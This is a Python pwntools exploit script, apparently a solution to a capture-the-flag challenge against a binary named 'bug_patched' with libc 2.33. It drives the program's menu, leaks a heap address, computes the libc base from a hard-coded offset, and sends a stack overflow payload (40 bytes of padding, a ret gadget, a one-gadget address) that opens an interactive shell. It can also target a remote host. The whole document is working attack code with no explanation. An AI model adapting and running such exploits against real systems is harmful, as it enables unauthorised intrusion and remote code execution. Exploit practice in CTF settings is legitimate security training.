from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './bug_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.33.so', checksec=False)
rop = ROP(elf)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
p.recvuntil(b'> ')
p.sendline(b'ba')
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')
p.sendline(b'201527')
p.recvuntil(b'at: ')

heap_leak = p.recvuntil(b'\n')
heap_leak = int(heap_leak.decode('utf-8'), 16)
info('Heap leak: ' + hex(heap_leak))
p.recvuntil(b'> ')
p.sendline(b'1')
libc.address = heap_leak + 212976
payload  = b'A'*40 # padding
payload += p64(0x0000000000401016) # ret;
payload += p64(heap_leak + 212976 + 0xde78f)
p.sendafter(b'Here you go:\n', payload)
p.interactive() # Start interactive shell


